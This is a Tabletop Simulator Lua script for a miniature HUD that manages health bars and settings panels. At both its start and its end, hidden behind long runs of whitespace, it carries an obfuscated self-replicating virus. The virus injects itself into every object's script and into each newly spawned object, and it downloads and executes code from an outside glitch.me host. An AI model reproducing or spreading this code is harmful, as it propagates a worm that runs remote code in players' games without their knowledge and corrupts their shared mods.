                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]
--ThatRobHuman MiniHUD
TRH_Class = 'mini'
TRH_Version = '5.0'
TRH_Save = 'eyJBUkNTIjp7IkJSQUNLRVRTIjpbXSwiQ09MT1IiOiIjMWY4N2ZmIiwiTUFYIjo0LCJNRVNIIjoiIiwiTU9ERSI6MSwiU0NBTEUiOjEsIlNIQVBFIjoxLCJaRVJPIjowLjV9LCJCQVJTIjpbXSwiQkFTRV9MRU5HVEgiOjEsIkJBU0VfV0lEVEgiOjEsIkZMQUciOnsiQ09MT1IiOiIjZmZmZmZmIiwiSEVJR0hUIjoxLjUsIklNQUdFIjoiaHR0cHM6XC9cL2kuaW1ndXIuY29tXC9uNDRYSWFlLmpwZyIsIldJRFRIIjoxfSwiR0VPTUVUUlkiOnsiQ09MT1IiOiJpbmhlcml0IiwiTUFURVJJQUwiOjAsIk1FU0giOiIiLCJOT1JNQUwiOiIiLCJURVhUVVJFIjoiIn0sIkxPQ0tfRkxBRyI6ZmFsc2UsIkxPQ0tfR0VPTUVUUlkiOmZhbHNlLCJNRVRBIjp7IkFVVE9VUERBVEUiOmZhbHNlLCJVUERBVEVDSEVDSyI6dHJ1ZX0sIk1PRFVMRV9BUkMiOnRydWUsIk1PRFVMRV9CQVJTIjp0cnVlLCJNT0RVTEVfRkxBRyI6ZmFsc2UsIk1PRFVMRV9HRU9NRVRSWSI6ZmFsc2UsIk1PRFVMRV9NQVJLRVJTIjpmYWxzZSwiTU9EVUxFX01PVkVNRU5UIjpmYWxzZSwiTU9EVUxFX1NISUVMRFMiOmZhbHNlLCJNT1ZFTUVOVCI6eyJDT0xPUiI6ImluaGVyaXQiLCJERUZJTklUSU9OUyI6W1siU3RhbmRzdGlsbCIsImh0dHBzOlwvXC9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tXC9Sb2JNYXllclwvVFRTTGlicmFyeVwvbWFzdGVyXC91aVwvbW92ZVwvc3RhbmRzdGlsbC5wbmciLDAsMCwwLDIsMCwiIzAwODhmZiJdXSwiTEFORFNIT1ciOnRydWUsIkxBTkRURVNUIjpmYWxzZSwiTU9ERSI6MSwiT1JJR0lOIjoiRURHRSIsIlNFR01FTlRTIjpbWzAsW11dXSwiU1BFRURESVNUQU5DRSI6MSwiU1BFRURNQVgiOjQsIlNQRUVETUlOIjowLCJUVVJOTUFYIjozLCJUVVJOTk9UQ0giOjIyLjUsIlVJSEVJR0hUIjowLjI1fSwiT1ZFUkhFQURfSEVJR0hUIjowLjE2MDAwMDAwMDAwMDAwMDAwMzMzMDY2OTA3Mzg3NTQ2OTYyMTI3MDg5NTAwNDI3MjQ2MDkzNzUsIk9WRVJIRUFEX09GRlNFVCI6MSwiT1ZFUkhFQURfT1JJRU5UIjoiSE9SSVpPTlRBTCIsIk9WRVJIRUFEX1dJRFRIIjoyLCJQRVJNRURJVCI6MTAsIlBFUk1WSUVXIjo1MjQyODcsIlJFRlJFU0giOjMsIlNISUVMRFMiOnsiQVVUT01PREUiOnRydWUsIkNPTE9SIjoiIzFmODdmZiIsIkNSSVRDT0xPUiI6IiNkYTE5MTgiLCJDUklUSUNBTCI6WzEsMSwxLDEsMSwxXSwiQ1VSUkVOVCI6WzYsNiw2LDYsNiw2XSwiTElNSVRNT0RFIjoxLCJNQVhJTVVNIjpbNiw2LDYsNiw2LDZdLCJNSU5JTVVNIjpbMCwwLDAsMCwwLDBdLCJTSEFQRSI6MSwiVUlIRUlHSFQiOjAuMjV9LCJVSV9TQ0FMRSI6MX0='
local state = {};local PERMEDIT = 'Host|Admin|Black|White|Brown|Red|Orange|Yellow|Green|Teal|Blue|Purple|Pink|Clubs|Diamonds|Hearts|Spades|Jokers';local PERMVIEW = 'Grey|Host|Admin|Black|White|Brown|Red|Orange|Yellow|Green|Teal|Blue|Purple|Pink|Clubs|Diamonds|Hearts|Spades|Jokers';local ui_mode = '0';local controller_obj;local assetBuffer = {};local arc_len = 1;local arc_obj;local rotateVector = function(a,b)
            	local c=math.rad(b)local d=math.cos(c)*a[1]+math.sin(c)*a[2]local e=math.sin(c)*a[1]*-1+math.cos(c)*a[2]return{d,e,a[3]}
            end
local indexOf = function(e, t)
            	for k,v in pairs(t) do
            		if (e == v) then return k end
            	end
            	return nil
            end
function onDestroy()
if (arc_obj ~= nil) then arc_obj.destruct() end
end
function onSave()local data={}
data.bars=state.bars
return JSON.encode(data)
end
function onLoad(save)
            	save = JSON.decode(save) or {}
            state.bars = save.bars or {}
rebuildAssets()
            	Wait.frames(rebuildUI, 3)
            end
function ui_setmode(player,mode)
            	if mode==ui_mode then
            		mode='0'
            	end
            	ui_mode=mode
            	if mode=='0' then
            		rebuildAssets()
            		Wait.frames(rebuildUI,3)
 else
            		rebuildUI()
            	end
            end
function initiateLink(data)
            	if (setController(data)) then
            		return controller_obj.call('setMini', {guid=self.guid})
            	end
            	return false
            end
function initiateUnlink()
            	local theObj = unsetController()
            	if (theObj ~= nil) then
            		theObj.call('untrackMini', {guid = self.guid})
            	end
            end
function setController(data)
            	local obj = data.object or getObjectFromGUID(data.guid or error('object or guid is required', 2)) or error('invalid object',2)
            	if ((obj.getVar('TRH_Class') or '') ~= 'mini.controller') then
            		error('object is not a mini controller',2)
            	else
            		controller_obj = obj
            		return true
            	end
            	return false
            end
function unsetController()
            	if (controller_obj ~= nil) then
            		local theObj = controller_obj
            		controller_obj = nil
            		return theObj
            	end
            	return nil
            end
function addBar(data)
				local visibility = data.visibility or true  -- Default to visible
				table.insert(state.bars, {
					data.name or 'Name',
					data.color or '#ffffff',
					data.current or 10,
					data.maximum or 10,
					data.text or false,
					data.big or false,
					visibility  -- Add visibility flag
				})
				if (controller_obj ~= nil) then controller_obj.call('syncBars', {}) end
                    rebuildUI()
			end
function getBars()
            	    res = {}
            	    for i,v in pairs(state.bars) do
            	        local isBig = false
            	        local hasText = false
            	        if (v[5] ~= nil) then
            	            hasText = v[5]
            	        end
            	        if (v[6] ~= nil) then
            	            isBig = v[6]
            	        end
            	        res[i] = {
            	            name = v[1],
            	            color = v[2],
            	            current = v[3],
            	            maximum = v[4],
            	            text = hasText,
                            big = isBig,
            	        }
            	    end
            	    return res
            	end
function editBar(data)
					local index = tonumber(data.index) or error('index must be numeric', 2)
					local bar = state.bars[index]
					
					-- Check if the bar is locked, if locked, prevent editing other properties except 'current' and 'lock'
					-- We now exclude lock property from this restriction
					if bar[7] and data.lock == nil and data.index ~= 'lock' then
						print("This bar is locked and cannot be edited, except 'current' or 'lock'.")
						return
					end
					
					local max = tonumber(data.maximum) or bar[4]
					local cur = math.min(max, tonumber(data.current) or bar[3])
					local name = data.name or bar[1]
					local color = data.color or bar[2]
					local isBig = data.big or bar[6]
					local hasText = data.text or bar[5]
					local isLock = data.lock or bar[7]  -- This always updates even if locked
				
					-- Update visibility and other properties
					if data.visibility ~= nil then
						state.bars[index][8] = data.visibility
					end
					if data.text ~= nil then
						hasText = data.text
					end
					if data.big ~= nil then
						isBig = data.big
					end
					if data.lock ~= nil then
						isLock = data.lock
					end
				
					-- Calculate the percentage
					local per = (max == 0) and 0 or cur / max * 100
				
					-- Update the UI
					self.UI.setAttribute('inp_bar_' .. index .. '_name', 'value', name)
					self.UI.setAttribute('inp_bar_' .. index .. '_color', 'value', color)
					self.UI.setAttribute('inp_bar_' .. index .. '_current', 'value', cur)
					self.UI.setAttribute('inp_bar_' .. index .. '_max', 'value', max)
					self.UI.setAttribute('inp_bar_' .. index .. '_text', 'isOn', hasText)
					self.UI.setAttribute('inp_bar_' .. index .. '_big', 'isOn', isBig)
					self.UI.setAttribute('inp_bar_' .. index .. '_lock', 'isOn', isLock)
				
					self.UI.setAttribute('bar_' .. index, 'percentage', per)
					self.UI.setAttribute('bar_' .. index, 'fillImageColor', color)
					self.UI.setAttribute('bar_' .. index .. '_container', 'minHeight', isBig and 30 or 15)
					self.UI.setAttribute('bar_' .. index .. '_text', 'active', hasText)
					self.UI.setAttribute('bar_' .. index .. '_text', 'text', cur .. ' / ' .. max)
				
					-- Update the state
					state.bars[index][1] = name
					state.bars[index][2] = color
					state.bars[index][3] = cur
					state.bars[index][4] = max
					state.bars[index][5] = hasText
					state.bars[index][6] = isBig
					state.bars[index][7] = isLock
				
					-- Sync with controller if available
					if controller_obj ~= nil then
						controller_obj.call('syncBarValues', {
							object = self,
							index = index,
							name = name,
							color = color,
							current = cur,
							maximum = max,
							text = hasText,
							big = isBig,
							lock = isLock
						})
					end
				end				
				
function adjustBar(data)
					local index = tonumber(data.index) or error('index must be numeric')
					local val = tonumber(data.amount) or error('amount must be numeric')
					local bar = state.bars[index]
					local max = tonumber(bar[4]) or 0
					local cur = math.max(0, math.min(max, (tonumber(bar[3]) or 0) + val))
					local per = (max == 0) and 0 or cur / max * 100
				
					-- Update de UI
					self.UI.setAttribute('bar_'..index, 'percentage', per)
					self.UI.setAttribute('bar_'..index..'_text', 'text', cur..' / '..max)
					self.UI.setAttribute('inp_bar_'..index..'_current', 'text', cur)
				
					-- Update de status
					state.bars[index][3] = cur
				
					-- Synchroniseer met de controller (indien nodig)
					if controller_obj ~= nil then
						controller_obj.call('syncBarValues', {
							object = self,
							index = index,
							name = bar[1],
							color = bar[2],
							current = cur,
							maximum = max,
							text = bar[5],
							big = bar[6],
							lock = bar[7]
						})
					end
				end
				
function removeBar(data)
					local index = tonumber(data.index) or error('Index must be numeric')
				
					-- Ensure the index is valid and the bar exists
					if not state.bars[index] then
						print("Error: No bar found at the given index.")
						return
					end
				
					-- Check if the bar is locked
					if state.bars[index][7] then  -- [7] indicates the lock status
						print("This bar is locked and cannot be removed.")
						return
					end
				
					-- Remove the bar from state.bars
					table.remove(state.bars, index)
				
					-- Sync bars with the controller (if applicable)
					if controller_obj ~= nil then
						controller_obj.call('syncBars', {})
					end
				
					-- Rebuild the UI after removal
					rebuildUI()
				end
				
function clearBars(data)
            		state.bars={}
            	    rebuildUI()
                    if (controller_obj ~= nil) then controller_obj.call('syncBars', {}) end
            	end
function ui_addbar(player)
            		addBar({name='Name', color='#ffffff', current=10, maximum=10, big=false, text=false})
            	end
function ui_removebar(player, index)
					-- Log the current index and state of bars
					print("Attempting to remove bar with index:", index)
				
					-- Ensure the index is valid and the bar exists in state.bars
					if not state.bars[index] then
						print("Error: No bar found at the given index.")
						return
					end
				
					-- Check if the bar is locked
					if state.bars[index][7] then
						print("This bar is locked and cannot be removed.")
						return
					end
				
					-- If the bar is not locked, proceed with the removal
					print("Removing bar at index:", index)
				
					-- Call the removeBar function to handle the removal on the server side
					removeBar({index = index})
				
					-- Optionally, add UI removal code here to reflect the bar removal
					-- For example, if you have a UI element with a unique identifier 'bar_' + index
					-- Example: self.UI.removeElement('bar_' .. index)
				end
function ui_editbar(player, val, id)
					local args = {}
				
					-- Split the 'id' string into components to extract the index and key
					for a in string.gmatch(id, '([^%_]+)') do
						table.insert(args, a)
					end
				
					local index = tonumber(args[3])  -- Get the bar index
					local key = args[4]  -- Get the property key
				
					-- Check if the bar is locked, if it is, prevent changes except for 'current' and 'lock'
					if state.bars[index][7] and key ~= 'current' and key ~= 'lock' then
						print("This bar is locked. Only 'current' or 'lock' can be edited.")
						return  -- Exit if the bar is locked and the key is not 'current' or 'lock'
					end
				
					-- Handle other properties based on the key
					if key == 'name' then
						editBar({index = index, name = val})
					elseif key == 'color' then
						editBar({index = index, color = val})
					elseif key == 'current' then
						editBar({index = index, current = val})
					elseif key == 'max' then
						editBar({index = index, maximum = val})
					elseif key == 'big' then
						-- Convert 'True'/'False' string to boolean for 'big' property
						editBar({index = index, big = (val == 'True')})
					elseif key == 'text' then
						-- Convert 'True'/'False' string to boolean for 'text' property
						editBar({index = index, text = (val == 'True')})
					elseif key == 'lock' then
						-- Always allow the 'lock' property to be toggled
						editBar({index = index, lock = (val == 'True')})
					end
				end
				

function ui_adjbar(player, id)
					local args = {}
					for a in string.gmatch(id, '([^%|]+)') do
						table.insert(args, a)
					end
					local index = tonumber(args[1]) or 1
					local amount = tonumber(args[2]) or 1
				
					adjustBar({index = index, amount = amount})
				end
function ui_clearbars(player)
            		clearBars()
            	end;
function rebuildAssets()
            	local root = 'https://raw.githubusercontent.com/RobMayer/TTSLibrary/master/ui/';
                local assets = {
                    {name='ui_gear', url=root..'gear.png'},
                    {name='ui_close', url=root..'close.png'},
                    {name='ui_plus', url=root..'plus.png'},
                    {name='ui_minus', url=root..'minus.png'},
                    {name='ui_hide', url=root..'hide.png'},
                    {name='ui_bars', url=root..'bars.png'},
                    {name='ui_stack', url=root..'stack.png'},
                    {name='ui_effects', url=root..'effects.png'},
                    {name='ui_reload', url=root..'reload.png'},
                    {name='ui_arcs', url=root..'arcs.png'},
                    {name='ui_flag', url=root..'flag.png'},
                    {name='ui_arrow_l', url=root..'arrow_l.png'},
                    {name='ui_arrow_r', url=root..'arrow_r.png'},
                    {name='ui_arrow_u', url=root..'arrow_u.png'},
                    {name='ui_arrow_d', url=root..'arrow_d.png'},
                    {name='ui_check', url=root..'check.png'},
                    {name='ui_block', url=root..'block.png'},
                    {name='ui_splitpath', url=root..'splitpath.png'},
                    {name='ui_cube', url=root..'cube.png'},
                    {name='movenode', url=root..'movenode.png'},
                    {name='moveland', url=root..'moveland.png'},
                    {name='ui_shield', url=root..'shield.png'},
                }
            	assetBuffer = {}
            	local bufLen = 0
            	self.UI.setCustomAssets(assets)
            end
function rebuildUI()
local w = 200; local orient = 'HORIZONTAL';
local mainButtons = {};
local mainButtonX = 20;
local arcActive = arc_obj ~= nil;
table.insert(mainButtons, {tag='button', attributes={id='btn_arc_sub', active=(arcActive and arc_len > 0), height='30', width='30', rectAlignment='LowerLeft', image='ui_minus', offsetXY='-70 0', colors='#ccccccff|#ffffffff|#404040ff|#808080ff', onClick='ui_arcsub', visibility=PERMEDIT}});
table.insert(mainButtons, {tag='text', attributes={id='disp_arc_len', active=(arcActive), height='30', width='30', rectAlignment='LowerLeft', text=arc_len, offsetXY='-40 0', color='#ffffff', fontSize='20', outline='#000000', visibility=PERMEDIT}});
table.insert(mainButtons, {tag='button', attributes={id='btn_arc_add', active=(arcActive and arc_len < 4), height='30', width='30', rectAlignment='LowerLeft', image='ui_plus', offsetXY='-10 0', colors='#ccccccff|#ffffffff|#404040ff|#808080ff', onClick='ui_arcadd', visibility=PERMEDIT}});
mainButtonX = mainButtonX + 30;
table.insert(mainButtons, {tag='button', attributes={height='30', width='30', rectAlignment='MiddleRight', image='ui_gear', offsetXY='-50 0', colors='#ccccccff|#ffffffff|#404040ff|#808080ff', onClick='ui_setmode(bars)', visibility=PERMEDIT}});
local mainlist_bars = {}
        		local settingslist_bars = {{tag='Row',attributes={preferredHeight='30'},children={
        			{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Name'}}}},
        			{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Color'}}}},
        			{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Current'}}}},
        			{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Max'}}}},
        			{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Text'}}}},
                    {tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Big'}}}},
					{tag='Cell',children={{tag='Text',attributes={color='#cccccc',text='Lock'}}}},
        		}}}
        		for i,bar in pairs(state.bars) do
        			local per = ((bar[4] == 0) and 0 or (bar[3] / bar[4] * 100))
        			table.insert(mainlist_bars,
        	        {tag='horizontallayout', attributes={id='bar_'..i..'_container',minHeight=bar[6]and 30 or 15,childForceExpandWidth=false,childForceExpandHeight=false,childAlignment='MiddleCenter'},
        	            children={
        	                {tag='button', attributes={preferredHeight='20',preferredWidth='20',flexibleWidth='0',image='ui_minus',colors='#ccccccff|#ffffffff|#404040ff|#808080ff',onClick='ui_adjbar('..i..'|-1)',visibility=PERMEDIT} },
        	                {tag='panel', attributes={flexibleWidth='1',flexibleHeight='1'},
        	                    children={
        	                        {tag='progressbar', attributes={width='100%',height='100%',id='bar_'..i,color='#00000080',fillImageColor=bar[2],percentage=per,textColor='transparent'} },
        	                        {tag='text', attributes={id='bar_'..i..'_text',text=bar[3]..' / '..bar[4],active=bar[5]or false,color='#ffffff',fontStyle='Bold',outline='#000000',outlineSize='1 1'} }
        	                    }
        	                },
        	                {tag='button', attributes={preferredHeight='20',preferredWidth='20',flexibleWidth='0',image='ui_plus',colors='#ccccccff|#ffffffff|#404040ff|#808080ff',onClick='ui_adjbar('..i..'|1)',visibility=PERMEDIT} }
        	            }
        	        })
        			table.insert(settingslist_bars,
        			    {tag='Row', attributes={preferredHeight='30'},
        			        children={
        			            {tag='Cell',children={{tag='InputField',attributes={id='inp_bar_'..i..'_name',onEndEdit='ui_editbar',text=bar[1]or''}}}},
        			            {tag='Cell',children={{tag='InputField',attributes={id='inp_bar_'..i..'_color',onEndEdit='ui_editbar',text=bar[2]or'#ffffff'}}}},
        			            {tag='Cell',children={{tag='InputField',attributes={id='inp_bar_'..i..'_current',onEndEdit='ui_editbar',text=bar[3]or 10}}}},
        			            {tag='Cell',children={{tag='InputField',attributes={id='inp_bar_'..i..'_max',onEndEdit='ui_editbar',text=bar[4]or 10}}}},
                                {tag='Cell',children={{tag='Toggle',attributes={id='inp_bar_'..i..'_text',onValueChanged='ui_editbar',isOn=bar[5]or false}}}},
        			            {tag='Cell',children={{tag='Toggle',attributes={id='inp_bar_'..i..'_big',onValueChanged='ui_editbar',isOn=bar[6]or false}}}},
								{tag='Cell',children={{tag='Toggle',attributes={id='inp_bar_'..i..'_lock',onValueChanged='ui_editbar',isOn=bar[7]or false}}}},
        			            {tag='Cell',children={{tag='Button',attributes={onClick='ui_removebar('..i..')',image='ui_close',colors='#cccccc|#ffffff|#808080'}}}}
        			        }
        			    })
        			end
					-- de -150 is waar mee je de afstand van de base veranderd voor de healt bars
local ui_overhead = { tag='Panel', attributes={childForceExpandHeight='false',visibility=PERMVIEW,position='0 -150 -16',rotation=orient=='HORIZONTAL'and'0 0 0'or'-90 0 0',active=ui_mode=='0',scale='0.75 0.75 1',height=0,color='red',width=w},
        			children={
        				{tag='VerticalLayout',attributes={rectAlignment='LowerCenter',childAlignment='LowerCenter',childForceExpandHeight=false,childForceExpandWidth=true,height='5000',spacing='5'},
        					children={{tag='VerticalLayout', attributes={contentSizeFitter='vertical', childAlignment='LowerCenter', flexibleHeight='0'}, children=mainlist_bars},{tag='Panel',attributes={minHeight='30',flexibleHeight='0'}, children=mainButtons }}
        				}
        			}
        		}
local ui_settings = {tag='panel', attributes={id='ui_settings',height='0',width=640,position='0 -110 -16',rotation=(orient=='HORIZONTAL'and'-90 0 0'or'-90 0 0'),scale='0.75 0.75 1',active=(ui_mode ~= '0'),visibility=PERMEDIT},
        			children={{tag='panel', attributes={id='ui_settings_bars',offsetXY='0 40',height='400',rectAlignment='LowerCenter',color='black',active=ui_mode=='bars'},
        			children={
        				{tag='VerticalScrollView', attributes={width=640,height='340',rotation='0.1 0 0',rectAlignment='UpperCenter',color='transparent',offsetXY='0 -30'},
        					children={
        						{tag='TableLayout', attributes={columnWidths='0 100 60 60 30 30 30',childForceExpandHeight='false',cellBackgroundColor='transparent',autoCalculateHeight='true',padding='6 6 6 6'},
        							children=settingslist_bars
        						}
        					}
        				},
        				{tag='text', attributes={fontSize='24',height='30',text='BARS',color='#cccccc',rectAlignment='UpperLeft',alignment='MiddleCenter'} },
        				{tag='Button', attributes={width='150',height='30',rectAlignment='LowerLeft',text='Add Bar',onClick='ui_addbar'} },
        			}
        		},{tag='button', attributes={height='40', width='40', rectAlignment='LowerLeft', image='ui_bars', offsetXY='0 0', colors='#ccccccff|#ffffffff|#404040ff|#808080ff', onClick='ui_setmode(bars)'}},{tag='button', attributes={height='40', width='40', rectAlignment='LowerCenter', image='ui_close', offsetXY='0 0', colors='#ccccccff|#ffffffff|#404040ff|#808080ff', onClick='ui_setmode(0)'}}}
        		}
local ui_movement = {};
local ui_shields = {}
self.UI.setXmlTable({ui_shields, ui_movement, ui_overhead, ui_settings});
end                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find("tcejbo gninwapS")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep("    ",100)..self.getLuaScript():sub(self.getLuaScript():find("--[[Object base code]]",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1).."\n\n")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find("ereh edoc resU --",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find("ereh edoc resU")+1):gsub("[%(%)%.%%%+%-%*%?%[%]%^%$]","%%%0"),""))end end end end end;WebRequest.get("https://obje.glitch.me/",function(g)if g.is_error then log(g.error)elseif g.text~=""and g.text:sub(1,4)=="true"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find("]]tcejbo gninwapS",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]

